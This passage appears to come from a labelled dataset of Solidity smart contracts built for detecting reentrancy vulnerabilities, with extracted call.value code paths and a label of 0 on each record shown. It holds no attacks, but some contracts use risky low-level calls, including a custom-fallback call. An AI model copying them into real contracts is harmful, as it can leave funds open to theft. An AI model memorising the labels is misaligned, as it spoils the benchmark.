_roundNumber); assert(!rewardInfo.isConfigured); rewardInfo.rewardInWei = _roundRewardInWei; if(_roundRewardInWei > 0){ rewardInfo.rewardRate = safeDiv(_roundRewardInWei, issuedTokensInRound[_roundNumber]); } rewardInfo.isConfigured = true; } function changeContractOwner(address _newContractOwner) public onlyContractOwner { isNewRound(); if (_newContractOwner != contractOwner) { contractOwner = _newContractOwner; } else { revert(); } } function changeRewardManager(address _newRewardManager) public onlyContractOwner { isNewRound(); if (_newRewardManager != rewardManager) { rewardManager = _newRewardManager; } else { revert(); } } function changeRoundManager(address _newRoundManager) public onlyContractOwner { isNewRound(); if (_newRoundManager != roundManager) { roundManager = _newRoundManager; } else { revert(); } } function changeIssueManager(address _newIssueManager) public onlyContractOwner { isNewRound(); if (_newIssueManager != issueManager) { issueManager = _newIssueManager; } else { revert(); } } function setBlocksPerRound(uint64 _newBlocksPerRound) public whenNotPaused onlyRoundManager { blocksPerRound = _newBlocksPerRound; } function pause() onlyContractOwner whenNotPaused public { paused = true; } function resume() onlyContractOwner whenPaused public { paused = false; } modifier onlyContractOwner() { if(msg.sender != contractOwner){ revert(); } _; } modifier onlyRewardManager() { if(msg.sender != rewardManager && msg.sender != contractOwner){ revert(); } _; } modifier onlyRoundManager() { if(msg.sender != roundManager && msg.sender != contractOwner){ revert(); } _; } modifier onlyIssueManager() { if(msg.sender != issueManager && msg.sender != contractOwner){ revert(); } _; } modifier notSelf(address _to) { if(msg.sender == _to){ revert(); } _; } modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function getRoundBalance(address _address, uint256 _round) public view returns (uint256) { return accountBalances[_address].roundBalanceMap[_round]; } function isModifiedInRound(address _address, uint64 _round) public view returns (bool) { return accountBalances[_address].wasModifiedInRoundMap[_round]; } function getBalanceModificationRounds(address _address) public view returns (uint64[]) { return accountBalances[_address].mapKeys; } function issueTokens(address _receiver, uint256 _tokenAmount) public whenNotPaused onlyIssueManager { isNewRound(); issue(_receiver, _tokenAmount); } function withdrawEther() public onlyContractOwner { isNewRound(); if(this.balance > 0) { contractOwner.transfer(this.balance); } else { revert(); } } function transfer(address _to, uint256 _value) public notSelf(_to) whenNotPaused returns (bool success){ require(_to != address(0)); bytes memory empty; if(isContract(_to)) { return transferToContract(msg.sender, _to, _value, empty); } else { return transferToAddress(msg.sender, _to, _value, empty); } } function balanceOf(address _owner) public constant returns (uint256 balance) { return accountBalances[_owner].addressBalance; } function totalSupply() public constant returns (uint256){ return totalTokens; } function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) { require(_to != address(0)); require(_value <= allowed[_from][msg.sender]); bytes memory empty; if(isContract(_to)) { require(transferToContract(_from, _to, _value, empty)); } else { require(transferToAddress(_from, _to, _value, empty)); } allowed[_from][msg.sender] = safeSub(allowed[_from][msg.sender], _value); return true; } function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view whenNotPaused returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint256 _addedValue) public returns (bool) { allowed[msg.sender][_spender] = safeAdd(allowed[msg.sender][_spender], _addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint256 _subtractedValue) public returns (bool) { uint256 oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = safeSub(oldValue, _subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function transfer(address _to, uint256 _value, bytes _data) public whenNotPaused notSelf(_to) returns (bool success){ require(_to != address(0)); if(isContract(_to)) { return transferToContract(msg.sender, _to, _value, _data); } else { return transferToAddress(msg.sender, _to, _value, _data); } } function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){ require(_to != address(0)); if(isContract(_to)) { if(accountBalances[msg.sender].addressBalance < _value){ revert(); } if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){ revert(); } isNewRound(); subFromAddressBalancesInfo(msg.sender, _value); addToAddressBalancesInfo(_to, _value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value, _data); Transfer(msg.sender, _to, _value); return true; } else { return transferToAddress(msg.sender, _to, _value, _data); } } function claimReward() public whenNotPaused returns (uint256 rewardAmountInWei) { isNewRound(); return claimRewardTillRound(currentRound); } function claimRewardTillRound(uint64 _claimTillRound) public whenNotPaused returns (uint256 rewardAmountInWei) { isNewRound(); rewardAmountInWei = calculateClaimableRewardTillRound(msg.sender, _claimTillRound); accountBalances[msg.sender].claimedRewardTillRound = _claimTillRound; if (rewardAmountInWei > 0){ accountBalances[msg.sender].totalClaimedReward = safeAdd(accountBalances[msg.sender].totalClaimedReward, rewardAmountInWei); msg.sender.transfer(rewardAmountInWei); } return rewardAmountInWei; } function calculateClaimableReward(address _address) public constant returns (uint256 rewardAmountInWei) { return calculateClaimableRewardTillRound(_address, currentRound); } function calculateClaimableRewardTillRound(address _address, uint64 _claimTillRound) public constant returns (uint256) { uint256 rewardAmountInWei = 0; if (_claimTillRound > currentRound) { revert(); } if (currentRound < 1) { revert(); } AddressBalanceInfoStructure storage accountBalanceInfo = accountBalances[_address]; if(accountBalanceInfo.mapKeys.length == 0){\trevert(); } uint64 userLastClaimedRewardRound = accountBalanceInfo.claimedRewardTillRound; if (_claimTillRound < userLastClaimedRewardRound) { revert(); } for (uint64 workRound = userLastClaimedRewardRound; workRound < _claimTillRound; workRound++) { Reward storage rewardInfo = reward[workRound]; assert(rewardInfo.isConfigured); if(accountBalanceInfo.wasModifiedInRoundMap[workRound]){ rewardAmountInWei = safeAdd(rewardAmountInWei, safeMul(accountBalanceInfo.roundBalanceMap[workRound], rewardInfo.rewardRate)); } else { uint64 lastBalanceModifiedRound = 0; for (uint256 i = accountBalanceInfo.mapKeys.length; i > 0; i--) { uint64 modificationInRound = accountBalanceInfo.mapKeys[i-1]; if (modificationInRound <= workRound) { lastBalanceModifiedRound = modificationInRound; break; } } rewardAmountInWei = safeAdd(rewardAmountInWei, safeMul(accountBalanceInfo.roundBalanceMap[lastBalanceModifiedRound], rewardInfo.rewardRate)); } } return rewardAmountInWei; } function createRounds(uint256 maxRounds) public { uint256 blocksAfterLastRound = safeSub(block.number, lastBlockNumberInRound); if(blocksAfterLastRound >= blocksPerRound){ uint256 roundsNeedToCreate = safeDiv(blocksAfterLastRound, blocksPerRound); if(roundsNeedToCreate > maxRounds){ roundsNeedToCreate = maxRounds; } lastBlockNumberInRound = safeAdd(lastBlockNumberInRound, safeMul(roundsNeedToCreate, blocksPerRound)); for (uint256 i = 0; i < roundsNeedToCreate; i++) { updateRoundInformation(); } } } function isContract(address _address) private view returns (bool is_contract) { uint256 length; assembly { length := extcodesize(_address) } return (length > 0); } function isNewRound() private { uint256 blocksAfterLastRound = safeSub(block.number, lastBlockNumberInRound); if(blocksAfterLastRound >= blocksPerRound){ updateRoundsInformation(blocksAfterLastRound); } } function updateRoundsInformation(uint256 _blocksAfterLastRound) private { uint256 roundsNeedToCreate = safeDiv(_blocksAfterLastRound, blocksPerRound); lastBlockNumberInRound = safeAdd(lastBlockNumberInRound, safeMul(roundsNeedToCreate, blocksPerRound)); for (uint256 i = 0; i < roundsNeedToCreate; i++) { updateRoundInformation(); } } function updateRoundInformation() private { issuedTokensInRound[currentRound] = issued; Reward storage rewardInfo = reward[currentRound]; rewardInfo.roundNumber = currentRound; currentRound = currentRound + 1; } function issue(address _receiver, uint256 _tokenAmount) private { if(_tokenAmount == 0){ revert(); } uint256 newIssuedAmount = safeAdd(_tokenAmount, issued); if(newIssuedAmount > totalTokens){ revert(); } addToAddressBalancesInfo(_receiver, _tokenAmount); issued = newIssuedAmount; bytes memory empty; if(isContract(_receiver)) { ContractReceiver receiverContract = ContractReceiver(_receiver); receiverContract.tokenFallback(msg.sender, _tokenAmount, empty); } Transfer(msg.sender, _receiver, _tokenAmount, empty); Transfer(msg.sender, _receiver, _tokenAmount); } function addToAddressBalancesInfo(address _receiver, uint256 _tokenAmount) private { AddressBalanceInfoStructure storage accountBalance = accountBalances[_receiver]; if(!accountBalance.wasModifiedInRoundMap[currentRound]){ if(accountBalance.mapKeys.length == 0 && currentRound > 0){ accountBalance.claimedRewardTillRound = currentRound; } accountBalance.mapKeys.push(currentRound); accountBalance.wasModifiedInRoundMap[currentRound] = true; } accountBalance.addressBalance = safeAdd(accountBalance.addressBalance, _tokenAmount); accountBalance.roundBalanceMap[currentRound] = accountBalance.addressBalance; } function subFromAddressBalancesInfo(address _adr, uint256 _tokenAmount) private { AddressBalanceInfoStructure storage accountBalance = accountBalances[_adr]; if(!accountBalance.wasModifiedInRoundMap[currentRound]){ accountBalance.mapKeys.push(currentRound); accountBalance.wasModifiedInRoundMap[currentRound] = true; } accountBalance.addressBalance = safeSub(accountBalance.addressBalance, _tokenAmount); accountBalance.roundBalanceMap[currentRound] = accountBalance.addressBalance; } function transferToAddress(address _from, address _to, uint256 _value, bytes _data) private returns (bool success) { if(accountBalances[_from].addressBalance < _value){ revert(); } if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){ revert(); } isNewRound(); subFromAddressBalancesInfo(_from, _value); addToAddressBalancesInfo(_to, _value); Transfer(_from, _to, _value, _data); Transfer(_from, _to, _value); return true; } function transferToContract(address _from, address _to, uint256 _value, bytes _data) private returns (bool success) { if(accountBalances[_from].addressBalance < _value){ revert(); } if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){ revert(); } isNewRound(); subFromAddressBalancesInfo(_from, _value); addToAddressBalancesInfo(_to, _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(_from, _value, _data); Transfer(_from, _to, _value, _data); Transfer(_from, _to, _value); return true; } } "}
{"sol name": "30101.sol", "label": 0, "first path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "second path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "third path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "long path": "pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract TelcoinSaleCapEscrow { using SafeMath for uint256; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); event WalletChanged(address indexed previousWallet, address indexed newWallet); event ValuePlaced(address indexed purchaser, address indexed beneficiary, uint256 amount); event Approved(address indexed participant, uint256 amount); event Rejected(address indexed participant); event Closed(); address public owner; address public wallet; bool public closed = false; mapping(address => uint256) public deposited; modifier onlyOwner() { require(msg.sender == owner); _; } modifier escrowOpen() { require(!closed); _; } function TelcoinSaleCapEscrow(address _wallet) public payable { require(msg.value > 0); require(_wallet != address(0)); owner = msg.sender; wallet = _wallet; wallet.transfer(msg.value); } function () public payable { placeValue(msg.sender); } function approve(address _participant, uint256 _weiAmount) onlyOwner public { uint256 depositedAmount = deposited[_participant]; require(depositedAmount > 0); require(_weiAmount <= depositedAmount); deposited[_participant] = depositedAmount.sub(_weiAmount); Approved(_participant, _weiAmount); wallet.transfer(_weiAmount); } function approveMany(address[] _participants, uint256[] _weiAmounts) onlyOwner public { require(_participants.length == _weiAmounts.length); for (uint256 i = 0; i < _participants.length; i++) { approve(_participants[i], _weiAmounts[i]); } } function changeWallet(address _wallet) onlyOwner public payable { require(_wallet != 0x0); require(msg.value > 0); WalletChanged(wallet, _wallet); wallet = _wallet; wallet.transfer(msg.value); } function close() onlyOwner public { require(!closed); closed = true; Closed(); } function placeValue(address _beneficiary) escrowOpen public payable { require(_beneficiary != address(0)); uint256 weiAmount = msg.value; require(weiAmount > 0); uint256 newDeposited = deposited[_beneficiary].add(weiAmount); deposited[_beneficiary] = newDeposited; ValuePlaced( msg.sender, _beneficiary, weiAmount ); } function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); } function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); } } function transferOwnership(address _to) onlyOwner public { require(_to != address(0)); OwnershipTransferred(owner, _to); owner = _to; } } "}
{"sol name": "9600.sol", "label": 0, "first path": "function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); ", "second path": "function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); ", "third path": "function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); ", "long path": "pragma solidity ^0.4.24; contract safeSend { bool private txMutex3847834; function doSafeSend(address toAddr, uint amount) internal { doSafeSendWData(toAddr, \"\", amount); } function doSafeSendWData(address toAddr, bytes data, uint amount) internal { require(txMutex3847834 == false, \"ss-guard\"); txMutex3847834 = true; require(toAddr.call.value(amount)(data), \"ss-failed\"); txMutex3847834 = false; } } contract payoutAllC is safeSend { address private _payTo; event PayoutAll(address payTo, uint value); constructor(address initPayTo) public { assert(initPayTo != address(0)); _payTo = initPayTo; } function _getPayTo() internal view returns (address) { return _payTo; } function _setPayTo(address newPayTo) internal { _payTo = newPayTo; } function payoutAll() external { address a = _getPayTo(); uint bal = address(this).balance; doSafeSend(a, bal); emit PayoutAll(a, bal); } } contract payoutAllCSettable is payoutAllC { constructor (address initPayTo) payoutAllC(initPayTo) public { } function setPayTo(address) external; function getPayTo() external view returns (address) { return _getPayTo(); } } contract owned { address public owner; event OwnerChanged(address newOwner); modifier only_owner() { require(msg.sender == owner, \"only_owner: forbidden\"); _; } modifier owner_or(address addr) { require(msg.sender == addr || msg.sender == owner, \"!owner-or\"); _; } constructor() public { owner = msg.sender; } function setOwner(address newOwner) only_owner() external { owner = newOwner; emit OwnerChanged(newOwner); } } contract CanReclaimToken is owned { function reclaimToken(ERC20Interface token) external only_owner { uint256 balance = token.balanceOf(this); require(token.approve(owner, balance)); } } contract controlledIface { function controller() external view returns (address); } contract hasAdmins is owned { mapping (uint => mapping (address => bool)) admins; uint public currAdminEpoch = 0; bool public adminsDisabledForever = false; address[] adminLog; event AdminAdded(address indexed newAdmin); event AdminRemoved(address indexed oldAdmin); event AdminEpochInc(); event AdminDisabledForever(); modifier only_admin() { require(adminsDisabledForever == false, \"admins must not be disabled\"); require(isAdmin(msg.sender), \"only_admin: forbidden\"); _; } constructor() public { _setAdmin(msg.sender, true); } function isAdmin(address a) view public returns (bool) { return admins[currAdminEpoch][a]; } function getAdminLogN() view external returns (uint) { return adminLog.length; } function getAdminLog(uint n) view external returns (address) { return adminLog[n]; } function upgradeMeAdmin(address newAdmin) only_admin() external { require(msg.sender != owner, \"owner cannot upgrade self\"); _setAdmin(msg.sender, false); _setAdmin(newAdmin, true); } function setAdmin(address a, bool _givePerms) only_admin() external { require(a != msg.sender && a != owner, \"cannot change your own (or owner's) permissions\"); _setAdmin(a, _givePerms); } function _setAdmin(address a, bool _givePerms) internal { admins[currAdminEpoch][a] = _givePerms; if (_givePerms) { emit AdminAdded(a); adminLog.push(a); } else { emit AdminRemoved(a); } } function incAdminEpoch() only_owner() external { currAdminEpoch++; admins[currAdminEpoch][msg.sender] = true; emit AdminEpochInc(); } function disableAdminForever() internal { currAdminEpoch++; adminsDisabledForever = true; emit AdminDisabledForever(); } } contract permissioned is owned, hasAdmins { mapping (address => bool) editAllowed; bool public adminLockdown = false; event PermissionError(address editAddr); event PermissionGranted(address editAddr); event PermissionRevoked(address editAddr); event PermissionsUpgraded(address oldSC, address newSC); event SelfUpgrade(address oldSC, address newSC); event AdminLockdown(); modifier only_editors() { require(editAllowed[msg.sender], \"only_editors: forbidden\"); _; } modifier no_lockdown() { require(adminLockdown == false, \"no_lockdown: check failed\"); _; } constructor() owned() hasAdmins() public { } function setPermissions(address e, bool _editPerms) no_lockdown() only_admin() external { editAllowed[e] = _editPerms; if (_editPerms) emit PermissionGranted(e); else emit PermissionRevoked(e); } function upgradePermissionedSC(address oldSC, address newSC) no_lockdown() only_admin() external { editAllowed[oldSC] = false; editAllowed[newSC] = true; emit PermissionsUpgraded(oldSC, newSC); } function upgradeMe(address newSC) only_editors() external { editAllowed[msg.sender] = false; editAllowed[newSC] = true; emit SelfUpgrade(msg.sender, newSC); } function hasPermissions(address a) public view returns (bool) { return editAllowed[a]; } function doLockdown() external only_owner() no_lockdown() { disableAdminForever(); adminLockdown = true; emit AdminLockdown(); } } contract upgradePtr { address ptr = address(0); modifier not_upgraded() { require(ptr == address(0), \"upgrade pointer is non-zero\"); _; } function getUpgradePointer() view external returns (address) { return ptr; } function doUpgradeInternal(address nextSC) internal { ptr = nextSC; } } interface ERC20Interface { function totalSupply() constant external returns (uint256 _totalSupply); function balanceOf(address _owner) constant external returns (uint256 balance); function transfer(address _to, uint256 _value) external returns (bool success); function transferFrom(address _from, address _to, uint256 _value) external returns (bool success); function approve(address _spender, uint256 _value) external returns (bool success); function allowance(address _owner, address _spender) constant external returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } library SafeMath { function subToZero(uint a, uint b) internal pure returns (uint) { if (a < b) { return 0; } return a - b; } } contract ixPaymentEvents { event UpgradedToPremium(bytes32 indexed democHash); event GrantedAccountTime(bytes32 indexed democHash, uint additionalSeconds, bytes32 ref); event AccountPayment(bytes32 indexed democHash, uint additionalSeconds); event SetCommunityBallotFee(uint amount); event SetBasicCentsPricePer30Days(uint amount); event SetPremiumMultiplier(uint8 multiplier); event DowngradeToBasic(bytes32 indexed democHash); event UpgradeToPremium(bytes32 indexed democHash); event SetExchangeRate(uint weiPerCent); event FreeExtension(bytes32 democHash); event SetBallotsPer30Days(uint amount); event SetFreeExtension(bytes32 democHash, bool hasFreeExt); event SetDenyPremium(bytes32 democHash, bool isPremiumDenied); event SetPayTo(address payTo); event SetMinorEditsAddr(address minorEditsAddr); event SetMinWeiForDInit(uint amount); } interface hasVersion { function getVersion() external pure returns (uint); } contract IxPaymentsIface is hasVersion, ixPaymentEvents, permissioned, CanReclaimToken, payoutAllCSettable { function emergencySetOwner(address newOwner) external; function weiBuysHowManySeconds(uint amount) public view returns (uint secs); function weiToCents(uint w) public view returns (uint); function centsToWei(uint c) public view returns (uint); function payForDemocracy(bytes32 democHash) external payable; function doFreeExtension(bytes32 democHash) external; function downgradeToBasic(bytes32 democHash) external; function upgradeToPremium(bytes32 democHash) external; function accountInGoodStanding(bytes32 democHash) external view returns (bool); function getSecondsRemaining(bytes32 democHash) external view returns (uint); function getPremiumStatus(bytes32 democHash) external view returns (bool); function getFreeExtension(bytes32 democHash) external view returns (bool); function getAccount(bytes32 democHash) external view returns (bool isPremium, uint lastPaymentTs, uint paidUpTill, bool hasFreeExtension); function getDenyPremium(bytes32 democHash) external view returns (bool); function giveTimeToDemoc(bytes32 democHash, uint additionalSeconds, bytes32 ref) external; function setPayTo(address) external; function setMinorEditsAddr(address) external; function setBasicCentsPricePer30Days(uint amount) external; function setBasicBallotsPer30Days(uint amount) external; function setPremiumMultiplier(uint8 amount) external; function setWeiPerCent(uint) external; function setFreeExtension(bytes32 democHash, bool hasFreeExt) external; function setDenyPremium(bytes32 democHash, bool isPremiumDenied) external; function setMinWeiForDInit(uint amount) external; function getBasicCentsPricePer30Days() external view returns(uint); function getBasicExtraBallotFeeWei() external view returns (uint); function getBasicBallotsPer30Days() external view returns (uint); function getPremiumMultiplier() external view returns (uint8); function getPremiumCentsPricePer30Days() external view returns (uint); function getWeiPerCent() external view returns (uint weiPerCent); function getUsdEthExchangeRate() external view returns (uint centsPerEth); function getMinWeiForDInit() external view returns (uint); function getPaymentLogN() external view returns (uint); function getPaymentLog(uint n) external view returns (bool _external, bytes32 _democHash, uint _seconds, uint _ethValue); } contract SVPayments is IxPaymentsIface { uint constant VERSION = 2; struct Account { bool isPremium; uint lastPaymentTs; uint paidUpTill; uint lastUpgradeTs; } struct PaymentLog { bool _external; bytes32 _democHash; uint _seconds; uint _ethValue; } address public minorEditsAddr; uint basicCentsPricePer30Days = 125000; uint basicBallotsPer30Days = 10; uint8 premiumMultiplier = 5; uint weiPerCent = 0.000016583747 ether; uint minWeiForDInit = 1; mapping (bytes32 => Account) accounts; PaymentLog[] payments; mapping (bytes32 => bool) denyPremium; mapping (bytes32 => bool) freeExtension; address public emergencyAdmin; function emergencySetOwner(address newOwner) external { require(msg.sender == emergencyAdmin, \"!emergency-owner\"); owner = newOwner; } constructor(address _emergencyAdmin) payoutAllCSettable(msg.sender) public { emergencyAdmin = _emergencyAdmin; assert(_emergencyAdmin != address(0)); } function getVersion() external pure returns (uint) { return VERSION; } function() payable public { _getPayTo().transfer(msg.value); } function _modAccountBalance(bytes32 democHash, uint additionalSeconds) internal { uint prevPaidTill = accounts[democHash].paidUpTill; if (prevPaidTill < now) { prevPaidTill = now; } accounts[democHash].paidUpTill = prevPaidTill + additionalSeconds; accounts[democHash].lastPaymentTs = now; } function weiBuysHowManySeconds(uint amount) public view returns (uint) { uint centsPaid = weiToCents(amount); uint monthsOffsetPaid = ((10 ** 18) * centsPaid) / basicCentsPricePer30Days; uint secondsOffsetPaid = monthsOffsetPaid * (30 days); uint additionalSeconds = secondsOffsetPaid / (10 ** 18); return additionalSeconds; } function weiToCents(uint w) public view returns (uint) { return w / weiPerCent; } function centsToWei(uint c) public view returns (uint) { return c * weiPerCent; } function payForDemocracy(bytes32 democHash) external payable { require(msg.value > 0, \"need to send some ether to make payment\"); uint additionalSeconds = weiBuysHowManySeconds(msg.value); if (accounts[democHash].isPremium) { additionalSeconds /= premiumMultiplier; } if (additionalSeconds >= 1) { _modAccountBalance(democHash, additionalSeconds); } payments.push(PaymentLog(false, democHash, additionalSeconds, msg.value)); emit AccountPayment(democHash, additionalSeconds); _getPayTo().transfer(msg.value); } function doFreeExtension(bytes32 democHash) external { require(freeExtension[democHash], \"!free\"); uint newPaidUpTill = now + 60 days; accounts[democHash].paidUpTill = newPaidUpTill; emit FreeExtension(democHash); } function downgradeToBasic(bytes32 democHash) only_editors() external { require(accounts[democHash].isPremium, \"!premium\"); accounts[democHash].isPremium = false; uint paidTill = accounts[democHash].paidUpTill; uint timeRemaining = SafeMath.subToZero(paidTill, now); if (timeRemaining > 0) { require(accounts[democHash].lastUpgradeTs < (now - 24 hours), \"downgrade-too-soon\"); timeRemaining *= premiumMultiplier; accounts[democHash].paidUpTill = now + timeRemaining; } emit DowngradeToBasic(democHash); } function upgradeToPremium(bytes32 democHash) only_editors() external { require(denyPremium[democHash] == false, \"upgrade-denied\"); require(!accounts[democHash].isPremium, \"!basic\"); accounts[democHash].isPremium = true; uint paidTill = accounts[democHash].paidUpTill; uint timeRemaining = SafeMath.subToZero(paidTill, now); if (timeRemaining > 0) { timeRemaining /= premiumMultiplier; accounts[democHash].paidUpTill = now + timeRemaining; } accounts[democHash].lastUpgradeTs = now; emit UpgradedToPremium(democHash); } function accountInGoodStanding(bytes32 democHash) external view returns (bool) { return accounts[democHash].paidUpTill >= now; } function getSecondsRemaining(bytes32 democHash) external view returns (uint) { return SafeMath.subToZero(accounts[democHash].paidUpTill, now); } function getPremiumStatus(bytes32 democHash) external view returns (bool) { return accounts[democHash].isPremium; } function getFreeExtension(bytes32 democHash) external view returns (bool) { return freeExtension[democHash]; } function getAccount(bytes32 democHash) external view returns (bool isPremium, uint lastPaymentTs, uint paidUpTill, bool hasFreeExtension) { isPremium = accounts[democHash].isPremium; lastPaymentTs = accounts[democHash].lastPaymentTs; paidUpTill = accounts[democHash].paidUpTill; hasFreeExtension = freeExtension[democHash]; } function getDenyPremium(bytes32 democHash) external view returns (bool) { return denyPremium[democHash]; } function giveTimeToDemoc(bytes32 democHash, uint additionalSeconds, bytes32 ref) owner_or(minorEditsAddr) external { _modAccountBalance(democHash, additionalSeconds); payments.push(PaymentLog(true, democHash, additionalSeconds, 0)); emit GrantedAccountTime(democHash, additionalSeconds, ref); } function setPayTo(address newPayTo) only_owner() external { _setPayTo(newPayTo); emit SetPayTo(newPayTo); } function setMinorEditsAddr(address a) only_owner() external { minorEditsAddr = a; emit SetMinorEditsAddr(a); } function setBasicCentsPricePer30Days(uint amount) only_owner() external { basicCentsPricePer30Days = amount; emit SetBasicCentsPricePer30Days(amount); } function setBasicBallotsPer30Days(uint amount) only_owner() external { basicBallotsPer30Days = amount; emit SetBallotsPer30Days(amount); } function setPremiumMultiplier(uint8 m) only_owner() external { premiumMultiplier = m; emit SetPremiumMultiplier(m); } function setWeiPerCent(uint wpc) owner_or(minorEditsAddr) external { weiPerCent = wpc; emit SetExchangeRate(wpc); } function setFreeExtension(bytes32 democHash, bool hasFreeExt) owner_or(minorEditsAddr) external { freeExtension[democHash] = hasFreeExt; emit SetFreeExtension(democHash, hasFreeExt); } function setDenyPremium(bytes32 democHash, bool isPremiumDenied) owner_or(minorEditsAddr) external { denyPremium[democHash] = isPremiumDenied; emit SetDenyPremium(democHash, isPremiumDenied); } function setMinWeiForDInit(uint amount) owner_or(minorEditsAddr) external { minWeiForDInit = amount; emit SetMinWeiForDInit(amount); } function getBasicCentsPricePer30Days() external view returns (uint) { return basicCentsPricePer30Days; } function getBasicExtraBallotFeeWei() external view returns (uint) { return centsToWei(basicCentsPricePer30Days / basicBallotsPer30Days); } function getBasicBallotsPer30Days() external view returns (uint) { return basicBallotsPer30Days; } function getPremiumMultiplier() external view returns (uint8) { return premiumMultiplier; } function getPremiumCentsPricePer30Days() external view returns (uint) { return _premiumPricePer30Days(); } function _premiumPricePer30Days() internal view returns (uint) { return uint(premiumMultiplier) * basicCentsPricePer30Days; } function getWeiPerCent() external view returns (uint) { return weiPerCent; } function getUsdEthExchangeRate() external view returns (uint) { return 1 ether / weiPerCent; } function getMinWeiForDInit() external view returns (uint) { return minWeiForDInit; } function getPaymentLogN() external view returns (uint) { return payments.length; } function getPaymentLog(uint n) external view returns (bool _external, bytes32 _democHash, uint _seconds, uint _ethValue) { _external = payments[n]._external; _democHash = payments[n]._democHash; _seconds = payments[n]._seconds; _ethValue = payments[n]._ethValue; } } "}
{"sol name": "40425.sol", "label": 0, "first path": "function BankOwner_WithdrawDonations() public modifier_isContractOwner()  modifier_wasValueSent() { if (_bankDonationsBalance > 0) { uint256 amount_ = _bankDonationsBalance; _bankDonationsBalance = 0; if (msg.sender.send(amount_)) { event_bankDonationsWithdrawn(amount_); }  else if (msg.sender.call.value(amount_)())  { event_bankDonationsWithdrawn(amount_); }  else { _bankDonationsBalance = amount_; function WithdrawAmountFromBankAccount(uint256 amount) public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool) { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; if (amount > 0 && _bankAccountsArray[accountNumber_].balance >= amount)  { _bankAccountsArray[accountNumber_].balance -= amount; if (msg.sender.send(amount))   { withdrawalSuccessful_ = true; else if (msg.sender.call.value(amount)()) { withdrawalSuccessful_ = true; }  else { _bankAccountsArray[accountNumber_].balance += amount; if (withdrawalSuccessful_)  { event_withdrawalMadeFromBankAccount_Successful(accountNumber_, amount); return true; }  else { event_withdrawalMadeFromBankAccount_Failed(accountNumber_, amount); return false; function WithdrawFullBalanceFromBankAccount() public modifier_doesSenderHaveABankAccount()  modifier_wasValueSent()  returns (bool)  { bool withdrawalSuccessful_ = false; uint32 accountNumber_ = _bankAccountAddresses[msg.sender].accountNumber; uint256 fullBalance_ = 0; if (_bankAccountsArray[accountNumber_].balance > 0)   { fullBalance_ = 